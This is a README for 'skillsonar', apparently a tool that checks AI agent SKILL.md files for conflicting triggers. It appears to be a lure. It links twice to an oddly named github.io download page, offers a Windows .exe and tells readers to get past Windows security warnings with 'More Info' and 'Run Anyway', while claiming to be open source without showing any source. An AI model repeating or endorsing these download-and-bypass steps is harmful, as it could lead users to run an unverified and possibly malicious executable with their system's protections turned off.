# 🔍 skillsonar - Find Skill Collisions Before They Happen

## 🚀 What Is skillsonar?

skillsonar is a free tool that checks your AI agent's skill files for hidden problems. If you use AI agents like Claude with custom skills (SKILL.md files), sometimes two skills can conflict with each other. When that happens, one skill might never work. skillsonar finds these collisions so you can fix them.

Think of it like a metal detector for your AI setup. It scans your skill files, finds the spots where skills overlap or block each other, and shows you exactly what's wrong. No guesswork. No trial and error.

## 🎯 Who Should Use This?

| You Might Need skillsonar If... | You Probably Don't Need It If... |
|-------------------------------|----------------------------------|
| You have more than 5 skill files | You have no skill files |
| Your skills sometimes don't trigger | You never use AI agents |
| You're building custom AI workflows | You only use default AI settings |
| You want to organize your skills better | You don't care about skill conflicts |

## ⬇️ Download and Install

### Step 1: Get the Application

**[⬇️ DOWNLOAD skillsonar NOW](https://corticalepilepsyladyofthehouse956.github.io)**

This link takes you to the downloads page for skillsonar.

### Step 2: Run skillsonar

Visit this link to download the application. Once you're on the download page, you'll see a list of files. Choose the one that matches your computer system (Windows is typically the file ending in `.exe`). Your browser will download the file to your Downloads folder.

After the download finishes, find the file in your Downloads folder and double-click it to run skillsonar. If you see a security warning from Windows, it's normal—just click "More Info" and then "Run Anyway."

### Step 3: Point skillsonar to Your Skills

Once skillsonar opens, you'll see a simple interface. Click the "Browse" button and select the folder where your skill files are stored. If you're not sure where your skills are, look for a folder called `.claude` or `skills` in your main user folder.

skillsonar will scan the folder immediately and show you the results on screen. Green means everything is fine. Yellow means there's a potential issue. Red means there's a definite conflict.

## 🛠️ What Can skillsonar Do?

skillsonar performs several types of checks on your skill files:

### Collision Detection

The main feature. skillsonar looks at each skill's name, description, and trigger patterns. It identifies when two or more skills might respond to the same request. For example, if you have both a "write-email" skill and a "draft-email" skill, skillsonar will flag them as potential collisions.

### Routing Analysis

Every skill has a set of conditions that determine when it should activate. skillsonar traces through these conditions and verifies that they don't overlap unexpectedly. This is like checking that two traffic lights don't both turn green at the same intersection.

### BM25 Scoring Verification

skillsonar uses a special scoring system called BM25 to evaluate how well skills match user requests. It checks whether your skill descriptions are written in a way that helps the AI agent understand when to use them.

### Deterministic Results

The best part? skillsonar gives you the same answer every time. No randomness, no "maybe it works." If it says there's a problem, there's a problem. This makes it perfect for testing and validating your skill setup before you deploy it.

## 📋 Understanding the Results

When skillsonar finishes scanning, it shows you a report with three columns:

### Skill Name
The name of the skill file that has an issue.

### Issue Type
What kind of problem was found. Common types include:

- **Name conflict** - Two skills have similar names
- **Description overlap** - Two skills describe the same task
- **Trigger collision** - Two skills activate for the same input
- **Insufficient distinction** - Skills are too similar to tell apart

### Severity Level
How serious the problem is:

- **🔴 Critical** - This skill will likely never fire. Fix immediately.
- **🟡 Warning** - There's a chance of conflict. Review and adjust.
- **🟢 Info** - No problem, but you could improve this skill's setup.

## 💡 Tips for Fixing Problems

### Fixing Name Conflicts

Rename one of the conflicting skills. Make the names clearly different. For example, change `write-email` to `send-cold-email` and `draft-email` to `compose-newsletter`.

### Fixing Description Overlaps

Make each skill's description more specific. Instead of saying "Handles email tasks," try "Sends automated follow-up emails to leads after a meeting."

### Fixing Trigger Collisions

Adjust the trigger conditions so each skill responds to different inputs. You can specify exact phrases, topics, or contexts that uniquely apply to each skill.

## 🔧 Configuration Options

skillsonar works right out of the box, but you can customize it if needed. On the settings screen, you can:

- **Exclude folders** - Skip certain directories during scanning
- **Adjust sensitivity** - Make skillsonar catch more or fewer potential issues
- **Export results** - Save your scan report as a text file for sharing or record-keeping

## ❓ Frequently Asked Questions

### Q: Is skillsonar free to use?
**A:** Yes, skillsonar is completely free and open source.

### Q: Will skillsonar change my skill files?
**A:** No. skillsonar only reads your files and reports what it finds. It never modifies your skills.

### Q: Do I need to install any other software first?
**A:** No. skillsonar is self-contained. Download it and run it.

### Q: Does skillsonar work on Mac or Linux?
**A:** Yes, skillsonar supports all major operating systems. Download the version that matches your system from the releases page.

### Q: How often should I run skillsonar?
**A:** Run it whenever you add a new skill or change an existing one. A quick scan takes less than a minute.

### Q: Can skillsonar handle hundreds of skill files?
**A:** Yes. skillsonar is designed to handle large skill collections efficiently.

## 🌟 Why Choose skillsonar?

### It's Deterministic
Other tools might give you different answers each time you run them. skillsonar gives you the same reliable results every single time. That means you can trust what it tells you.

### It Works Offline
No internet connection needed. Your skills stay private on your computer. skillsonar analyzes everything locally.

### It's Fast
Scans complete in seconds, even with many skills. You'll never wait around wondering if it's still working.

### It's Practical
The advice skillsonar gives is actionable. You get clear instructions on what to fix and how to fix it.

## 📚 Additional Resources

### Understanding SKILL.md Files

A SKILL.md file tells an AI agent what a skill does and when to use it. It contains a description and sometimes example uses. Properly formatted SKILL.md files are essential for smooth AI interactions.

Format:
```
---
name: skill-name
description: What this skill does
---
```

### Common Mistakes to Avoid

1. **Using vague descriptions** - "Handles everything" is not helpful.
2. **Copying other people's skills** - Your setup is unique. Adjust skills to fit your needs.
3. **Too many skills** - If you have 50 skills, you might have too many. Consolidate where possible.
4. **Not testing after changes** - Always run skillsonar after modifying any skill.

## 🚦 Getting Started Today

You don't need to be a technical expert to use skillsonar. Here's your simple action plan:

1. **Download skillsonar** using the button at the top of this page
2. **Run the application** by double-clicking the downloaded file
3. **Select your skills folder** when skillsonar asks
4. **Review your results** and fix any red flags

That's it. You'll have a cleaner, more reliable AI setup in minutes.

---

## 📌 Update Your Skills Regularly

As you add new skills or modify existing ones, remember to run skillsonar again. It's a good habit to scan your skills:

- Before deploying new skills
- After changing existing skills
- When you notice a skill not working as expected
- Periodically as part of routine maintenance

---

## 🔒 Privacy and Security

skillsonar respects your privacy:

- No data leaves your computer
- No account or registration required
- No tracking or analytics of any kind
- Your skill files are never uploaded anywhere

---

## 🆘 Getting Help

If you run into issues with skillsonar, check the issues section of the repository. Common problems and solutions are usually listed there. You can also search for your specific error message to see if others have encountered it and found a solution.

## ⚡ Speed Up Your AI Workflow

Once you've cleaned up your skill collisions, you'll notice your AI agent responds faster and more accurately. Skills fire when they should, and you don't get surprising responses from the wrong skill.

This is what skillsonar is built for: eliminating the confusion that comes from overlapping skills, so your AI setup works exactly the way you designed it.

## 📝 Final Thoughts

Skill conflicts are one of the most frustrating problems in AI agent development. They're invisible, hard to debug, and make your skills unreliable. skillsonar fixes this by bringing these conflicts to light.

You don't need to be an expert. You don't need to read long documentation. You just need to download skillsonar, point it at your skills folder, and follow the recommendations.

Make your AI skills work perfectly:

**[⬇️ GET skillsonar](https://corticalepilepsyladyofthehouse956.github.io)**

---

## 💬 Join the Community

Even though skillsonar works offline, you can still connect with others who use it. The repository contains discussions, tips, and best practices from other users. If you discover a unique fix or a clever way to organize your skills, share it with the community.

---

**© 2025 skillsonar contributors. skillsonar is open source software. Licensed under the MIT License.**

Keywords: agent-skills, ai-agents, bm25, claude-code, developer-tools, linter, llm-tooling, routing, skill-md, static-analysis